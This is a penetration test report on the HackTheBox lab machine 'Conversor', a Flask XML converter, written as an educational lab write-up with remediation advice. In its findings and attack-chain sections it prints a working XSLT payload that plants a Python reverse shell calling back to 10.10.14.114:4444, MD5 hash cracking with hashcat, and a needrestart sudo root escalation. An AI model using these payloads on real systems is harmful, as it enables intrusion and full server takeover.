# PENETRATION TESTING REPORT

## Conversor Web Application - HackTheBox Lab Environment

**Assessment Type:** Web Application Penetration Test
**Target Environment:** HackTheBox Academy Lab

## Date of Test Event

**Testing Period:** 2026-01-17
**Timezone:** EST (UTC-5)

## Table of Contents

1. [Document Revision History](#document-revision-history)
2. [Statement of Confidentiality](#statement-of-confidentiality)
3. [Executive Summary](#executive-summary)
4. [Scope and Duration](#scope-and-duration)
5. [Technical Findings](#technical-findings)
6. [Attack Chain Walkthrough](#attack-chain-walkthrough)
7. [Remediation Summary](#remediation-summary)
8. [Appendices](#appendices)

---

## Document Revision History

| Author       | Date       | Version | Comment       |
| ------------ | ---------- | ------- | ------------- |
| Security Analyst | 2026-01-17 | 1.0     | Initial draft |

---

## Statement of Confidentiality

This document contains security assessment findings from a HackTheBox Academy lab environment. The techniques, vulnerabilities, and exploitation methods documented herein are for educational purposes within an authorized training context.

---

## Executive Summary

This penetration test assessed the security posture of the Conversor web application, a Flask-based XML-to-HTML converter hosted on an Ubuntu Linux server. The assessment successfully achieved full system compromise through a chain of vulnerabilities, progressing from unauthenticated web access to root-level system control.

### Key Findings Summary

| Severity | Count | Description |
|----------|-------|-------------|
| Critical | 2     | XSLT Injection leading to RCE, Sudo Misconfiguration (needrestart) |
| High     | 2     | Weak Password Hashing (MD5), Hardcoded Flask Secret Key |
| Medium   | 1     | Cron Job Executing Arbitrary Python Scripts |
| Low      | 1     | Source Code Disclosure |

### Attack Chain Overview

1. **Initial Access:** Exploited XSLT injection vulnerability in XML converter to write arbitrary files
2. **Code Execution:** Deployed Python reverse shell via cron-executed scripts directory
3. **Credential Harvesting:** Extracted and cracked MD5 password hashes from SQLite database
4. **Privilege Escalation:** Exploited sudo permissions on `needrestart` utility to obtain root shell

### Overall Risk Assessment

**Critical** - The application contains multiple chained vulnerabilities that allow an unauthenticated attacker to achieve complete system compromise with minimal technical skill required.

---

## Scope and Duration

| Asset | IP Address | Role | Environment |
|-------|------------|------|-------------|
| conversor.htb | 10.129.238.31 | Web Application Server | HackTheBox Lab |

### Services Identified

| Port | Protocol | Service | Version |
|------|----------|---------|---------|
| 22/tcp | TCP | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 |
| 80/tcp | TCP | HTTP | Apache httpd 2.4.52 |

*Source: logs/nmap_scan.log*

### Operating System

- **Detected OS:** Linux 4.15 - 5.19 (Ubuntu)
- **Hostname:** conversor.htb

---

## Technical Findings

---

### FINDING ID: PT-001

**Finding Title:** XSLT Injection Leading to Remote Code Execution

**Severity:** Critical
**Risk Rating:** CVSS v3.1: 9.8 (Critical)

**Mapped Controls:**
- CWE-74: Improper Neutralization of Special Elements in Output
- CWE-94: Improper Control of Generation of Code
- OWASP: A03:2021 - Injection

---

#### Summary

The Conversor application processes user-supplied XSLT stylesheets without adequate sanitization. The XSLT processor supports extension functions including `exslt:document`, which allows writing arbitrary files to the filesystem. Combined with the server's cron configuration that executes Python scripts from a writable directory, this vulnerability enables unauthenticated remote code execution.

---

#### Affected Assets

| Asset | IP / Hostname | Role | Environment |
|-------|---------------|------|-------------|
| Conversor Web App | 10.129.238.31 / conversor.htb | XML Converter | Production |

---

#### Vulnerability Type

- **Category:** Injection, Code Execution
- **Weakness Class:** CWE-74, CWE-94

---

#### Description

The application's XML conversion functionality (`/convert` endpoint) accepts user-uploaded XML and XSLT files, processes them using the `lxml` library's XSLT processor, and returns the transformed output.

While the XML parser disables external entity resolution (`resolve_entities=False`), the XSLT processor permits the use of EXSLT extension functions. The `exslt:document` extension allows the stylesheet to write output to arbitrary file paths on the server filesystem.

The server is configured with a cron job that executes all Python scripts in `/var/www/conversor.htb/scripts/` every minute as the `www-data` user. By combining the file write capability with this execution mechanism, an attacker can achieve code execution.

**Vulnerable Code (evidence/source/app.py:103-108):**
```python
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
xml_tree = etree.parse(xml_path, parser)
xslt_tree = etree.parse(xslt_path)  # No restrictions on XSLT
transform = etree.XSLT(xslt_tree)
result_tree = transform(xml_tree)
```

**Cron Configuration (evidence/source/install.md):**
```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

---

#### Attack Vector

- **Network Access:** Remote, unauthenticated access to the web application
- **Authentication:** Account registration required (no email verification)
- **User Interaction:** None required after payload deployment

---

#### Proof of Concept / Evidence

**Malicious XSLT Payload (scripts/payload.xslt):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.114",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/bash");
    </exploit:document>
    Reverse shell payload deployed
  </xsl:template>
</xsl:stylesheet>
```

*Source: scripts/payload.xslt, evidence/browser.log*

---

#### Exploitation Details

1. Registered test account on the application
2. Created malicious XSLT stylesheet using `exslt:document` extension
3. Uploaded minimal XML file with the malicious XSLT via `/convert` endpoint
4. Established netcat listener on attacker machine (port 4444)
5. Waited for cron execution to trigger reverse shell
6. Received shell as `www-data` user

**Tools Used:** Netcat listener, custom XSLT payload

---

#### Impact

- **Remote Code Execution:** Complete control over web application server
- **Data Exposure:** Access to application database, uploaded files, and configuration
- **Lateral Movement:** Potential pivot point to internal network
- **Service Availability:** Attacker could disrupt or destroy the service

---

#### Likelihood

**High** - The vulnerability requires minimal technical skill to exploit. Public documentation exists for XSLT injection techniques, and the attack requires only basic web interaction.

---

#### Recommendations

1. **Immediate:** Disable EXSLT extensions in the XSLT processor by using a restricted parser configuration
2. **Immediate:** Remove or secure the cron job that executes arbitrary scripts
3. **Short-term:** Implement allowlisting for XSLT functions and elements
4. **Long-term:** Consider using a sandboxed transformation service or library with security-first design

**Secure Code Example:**
```python
from lxml import etree

# Create restricted XSLT processor
xslt_ac = etree.XSLTAccessControl(
    read_file=False,
    write_file=False,
    create_dir=False,
    read_network=False,
    write_network=False
)
transform = etree.XSLT(xslt_tree, access_control=xslt_ac)
```

---

#### References

- CWE-74: https://cwe.mitre.org/data/definitions/74.html
- OWASP XSLT Injection: https://owasp.org/www-community/vulnerabilities/XSLT_Injection
- lxml Security: https://lxml.de/xpathxslt.html#xslt

---

#### Status

**Open**

---

### FINDING ID: PT-002

**Finding Title:** Weak Password Hashing (Unsalted MD5)

**Severity:** High
**Risk Rating:** CVSS v3.1: 7.5 (High)

**Mapped Controls:**
- CWE-328: Use of Weak Hash
- CWE-916: Use of Password Hash With Insufficient Computational Effort
- NIST 800-53: IA-5

---

#### Summary

The application stores user passwords using unsalted MD5 hashes. MD5 is a cryptographically broken hash function that can be reversed using rainbow tables or cracked with commodity hardware in seconds.

---

#### Affected Assets

| Asset | IP / Hostname | Role | Environment |
|-------|---------------|------|-------------|
| SQLite Database | /var/www/conversor.htb/instance/users.db | User Credential Store | Production |

---

#### Description

User registration and authentication functions hash passwords using Python's `hashlib.md5()` without any salt. This allows attackers with database access to rapidly crack passwords using precomputed tables or brute force attacks.

**Vulnerable Code (evidence/source/app.py:52,77):**
```python
password = hashlib.md5(request.form['password'].encode()).hexdigest()
```

---

#### Proof of Concept / Evidence

**Database Extraction:**
```
sqlite> select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|Test|352f03d713b9bebaa8c9ad48e6c71fdec
```

**Hashcat Cracking (evidence/hashcat.log):**
```
$ hashcat -a 0 -m 0 '5b5c3ac3a1c897c94caad48e6c71fdec' /usr/share/wordlists/rockyou.txt

5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Time.Started.....: Sat Jan 17 17:21:56 2026 (2 secs)
Speed.#01........: 5894.6 kH/s
```

The password was cracked in 2 seconds using a common wordlist.

*Source: tasks.md, evidence/hashcat.log*

---

#### Impact

- **Credential Compromise:** User passwords can be recovered in seconds
- **Account Takeover:** Compromised credentials enable unauthorized access
- **Credential Reuse:** Users often reuse passwords across services

---

#### Recommendations

1. **Immediate:** Migrate to bcrypt, scrypt, or Argon2 password hashing
2. **Immediate:** Force password reset for all existing users
3. **Short-term:** Implement password complexity requirements
4. **Long-term:** Consider passwordless authentication options

**Secure Code Example:**
```python
from werkzeug.security import generate_password_hash, check_password_hash

# Registration
password_hash = generate_password_hash(request.form['password'])

# Login
if check_password_hash(stored_hash, request.form['password']):
    # Authenticated
```

---

#### References

- CWE-328: https://cwe.mitre.org/data/definitions/328.html
- OWASP Password Storage: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html

---

#### Status

**Open**

---

### FINDING ID: PT-003

**Finding Title:** Sudo Misconfiguration - Needrestart Privilege Escalation

**Severity:** Critical
**Risk Rating:** CVSS v3.1: 8.8 (High)

**Mapped Controls:**
- CWE-269: Improper Privilege Management
- CWE-250: Execution with Unnecessary Privileges
- NIST 800-53: AC-6

---

#### Summary

The `fismathack` user is configured with passwordless sudo access to the `/usr/sbin/needrestart` utility. The needrestart utility can be exploited by specifying a malicious configuration file, allowing arbitrary command execution as root.

---

#### Affected Assets

| Asset | IP / Hostname | Role | Environment |
|-------|---------------|------|-------------|
| conversor.htb | 10.129.238.31 | Linux Server | Production |

---

#### Description

The sudo configuration permits the `fismathack` user to run `needrestart` without password authentication:

```
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

The `needrestart` utility accepts a `-c` flag to specify an alternate configuration file. By pointing to a file containing Perl code (needrestart configs are Perl), arbitrary commands can be executed with root privileges.

---

#### Proof of Concept / Evidence

**Sudo Configuration Check (evidence/console.log):**
```
fismathack@conversor:~$ sudo -l
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

**Exploitation:**
```bash
fismathack@conversor:~$ echo 'exec "/bin/sh","-p";' > /tmp/con.conf
fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /tmp/con.conf
# cat /root/root.txt
8318b96a9d2a55d01bace4ec243b4108
```

*Source: evidence/console.log*

---

#### Exploitation Details

1. Enumerated sudo permissions using `sudo -l`
2. Created malicious configuration file with Perl exec statement
3. Executed needrestart with custom configuration via sudo
4. Obtained root shell

**Tools Used:** Native system utilities

---

#### Impact

- **Complete System Compromise:** Full root access to the server
- **Data Breach:** Access to all files and databases on the system
- **Persistence:** Ability to install rootkits or backdoors
- **Lateral Movement:** Potential access to other systems using harvested credentials

---

#### Recommendations

1. **Immediate:** Remove needrestart from sudoers or restrict to specific configurations
2. **Short-term:** Audit all sudo configurations for similar misconfigurations
3. **Long-term:** Implement least-privilege access controls

**Secure Sudoers Configuration:**
```
# If needrestart is required, restrict arguments
fismathack ALL=(ALL) NOPASSWD: /usr/sbin/needrestart -r a
```

---

#### References

- GTFOBins needrestart: https://gtfobins.github.io/gtfobins/needrestart/
- CWE-269: https://cwe.mitre.org/data/definitions/269.html

---

#### Status

**Open**

---

### FINDING ID: PT-004

**Finding Title:** Hardcoded Flask Secret Key

**Severity:** High
**Risk Rating:** CVSS v3.1: 7.5 (High)

**Mapped Controls:**
- CWE-798: Use of Hard-coded Credentials
- CWE-321: Use of Hard-coded Cryptographic Key
- NIST 800-53: SC-12

---

#### Summary

The Flask application uses a hardcoded secret key (`Changemeplease`) for session management. This key is exposed in the publicly downloadable source code, allowing attackers to forge session tokens and impersonate any user.

---

#### Description

**Vulnerable Code (evidence/source/app.py:5):**
```python
app.secret_key = 'Changemeplease'
```

With knowledge of the secret key, an attacker can:
- Decode existing session cookies
- Forge session cookies to impersonate any user
- Bypass authentication entirely

---

#### Recommendations

1. **Immediate:** Generate a cryptographically secure random secret key
2. **Immediate:** Store secret key in environment variables, not source code
3. **Short-term:** Rotate all session tokens after key change

**Secure Implementation:**
```python
import os
app.secret_key = os.environ.get('FLASK_SECRET_KEY') or os.urandom(32)
```

---

#### Status

**Open**

---

### FINDING ID: PT-005

**Finding Title:** Source Code Disclosure

**Severity:** Low
**Risk Rating:** CVSS v3.1: 5.3 (Medium)

**Mapped Controls:**
- CWE-540: Inclusion of Sensitive Information in Source Code
- OWASP: A01:2021 - Broken Access Control

---

#### Summary

The application's About page provides a direct download link to the complete source code archive (`source_code.tar.gz`). This disclosure enables attackers to perform detailed code review to identify vulnerabilities before exploitation.

---

#### Description

The downloadable archive contains:
- Complete application source code (app.py)
- Database schema and path information
- Installation instructions revealing server configuration
- Flask secret key

*Source: evidence/browser.log*

---

#### Recommendations

1. **Immediate:** Remove source code download from production
2. **Short-term:** Review all publicly accessible files for sensitive content

---

#### Status

**Open**

---

## Attack Chain Walkthrough

This section documents the complete attack path from initial reconnaissance to full system compromise.

### Phase 1: Reconnaissance

**Nmap Scanning:**
```
nmap -sS -sV -T4 10.129.238.31

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    Apache httpd 2.4.52
Service Info: Host: conversor.htb
```

The scan identified two open services: SSH and HTTP. The HTTP service hostname revealed the target domain `conversor.htb`.

*Source: logs/nmap_scan.log*

### Phase 2: Web Application Analysis

1. Browsed to the web application and identified a login form
2. Registered a test account (username: `Test`, password: `1qaz2wsx!QAZ@WSX`)
3. Discovered the application converts XML files using XSLT stylesheets
4. Located source code download link on the About page
5. Downloaded and analyzed `source_code.tar.gz`

**Key Findings from Source Code Review:**
- SQLite database at `/var/www/conversor.htb/instance/users.db`
- Flask application with hardcoded secret key
- MD5 password hashing without salt
- Cron job executing Python scripts from writable directory

*Source: evidence/browser.log, evidence/source/app.py*

### Phase 3: Initial Exploitation (XSLT Injection)

**Attack Execution:**

1. Created minimal XML payload:
```xml
<?xml version="1.0"?>
<root>test</root>
```

2. Created malicious XSLT stylesheet to deploy reverse shell:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit" version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.114",4444));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
pty.spawn("/bin/bash");
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

3. Started netcat listener: `nc -lvnp 4444`
4. Uploaded payload via the convert functionality
5. Received reverse shell as `www-data` user within 60 seconds

*Source: scripts/payload.xml, scripts/payload.xslt*

### Phase 4: Credential Harvesting

With shell access as `www-data`:

1. Located SQLite database: `/var/www/conversor.htb/instance/users.db`
2. Extracted user credentials:
```sql
sqlite> select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|Test|352f03d713b9bebaa8c9ad48e6c71fdec
```

3. Cracked MD5 hash using hashcat:
```
hashcat -a 0 -m 0 '5b5c3ac3a1c897c94caad48e6c71fdec' rockyou.txt
Result: Keepmesafeandwarm
```

*Source: tasks.md, evidence/hashcat.log*

### Phase 5: Lateral Movement

Authenticated via SSH using recovered credentials:
```
ssh fismathack@10.129.238.31
Password: Keepmesafeandwarm
```

**User Flag Captured:**
```
fismathack@conversor:~$ cat user.txt
6a2e86cd4ecea33cf90b0b7fe4e18f4e
```

*Source: evidence/console.log*

### Phase 6: Privilege Escalation

1. Enumerated sudo permissions:
```
fismathack@conversor:~$ sudo -l
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

2. Exploited needrestart configuration file injection:
```bash
echo 'exec "/bin/sh","-p";' > /tmp/con.conf
sudo /usr/sbin/needrestart -c /tmp/con.conf
```

3. Obtained root shell:
```
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root Flag Captured:**
```
# cat /root/root.txt
8318b96a9d2a55d01bace4ec243b4108
```

*Source: evidence/console.log*

---

## Remediation Summary

### Short Term (0-30 Days)

| Priority | Finding | Action |
|----------|---------|--------|
| Critical | PT-001 | Disable EXSLT extensions and secure XSLT processing |
| Critical | PT-003 | Remove needrestart from sudoers configuration |
| High | PT-002 | Migrate password hashing to bcrypt/Argon2 |
| High | PT-004 | Replace hardcoded secret key with environment variable |

### Medium Term (30-90 Days)

| Priority | Finding | Action |
|----------|---------|--------|
| Medium | PT-001 | Remove or secure cron job executing arbitrary scripts |
| Low | PT-005 | Remove source code download from production |
| All | General | Implement comprehensive security audit of configurations |

### Long Term (90+ Days)

- Implement regular penetration testing schedule
- Deploy web application firewall (WAF)
- Establish secure development lifecycle practices
- Implement centralized logging and security monitoring

---

## Appendices

### Appendix A: Finding Severities

| Severity | CVSS Score | Description |
|----------|------------|-------------|
| Critical | 9.0 - 10.0 | Immediate exploitation likely, severe impact |
| High | 7.0 - 8.9 | Exploitation probable, significant impact |
| Medium | 4.0 - 6.9 | Exploitation possible, moderate impact |
| Low | 0.1 - 3.9 | Limited exploitation potential, minor impact |

### Appendix B: Exploited Hosts

| Host | IP Address | Access Level | Method |
|------|------------|--------------|--------|
| conversor.htb | 10.129.238.31 | Root | XSLT Injection + Sudo Exploit |

### Appendix C: Compromised Accounts

| Username | Access Level | Credential Source |
|----------|--------------|-------------------|
| www-data | Service Account | XSLT Injection (RCE) |
| fismathack | User | SQLite Database (MD5 crack) |
| root | Superuser | Sudo misconfiguration |

### Appendix D: Flags Captured

| Flag Type | Value | Location |
|-----------|-------|----------|
| User | 6a2e86cd4ecea33cf90b0b7fe4e18f4e | /home/fismathack/user.txt |
| Root | 8318b96a9d2a55d01bace4ec243b4108 | /root/root.txt |

### Appendix E: Tools Used

| Tool | Purpose |
|------|---------|
| Nmap 7.98 | Network reconnaissance and service enumeration |
| Hashcat 7.1.2 | Password hash cracking |
| Netcat | Reverse shell listener |
| Custom XSLT | Exploitation payload |

### Appendix F: Files and Evidence

| File | Description |
|------|-------------|
| logs/nmap_scan.log | Complete Nmap scan output |
| evidence/browser.log | Web application reconnaissance notes |
| evidence/console.log | Shell session commands and output |
| evidence/hashcat.log | Password cracking session |
| evidence/source/ | Downloaded application source code |
| scripts/payload.xml | XML payload file |
| scripts/payload.xslt | XSLT injection payload |
| scans/*.nmap | Individual Nmap scan outputs |

---

*Report generated from HackTheBox Academy lab assessment*
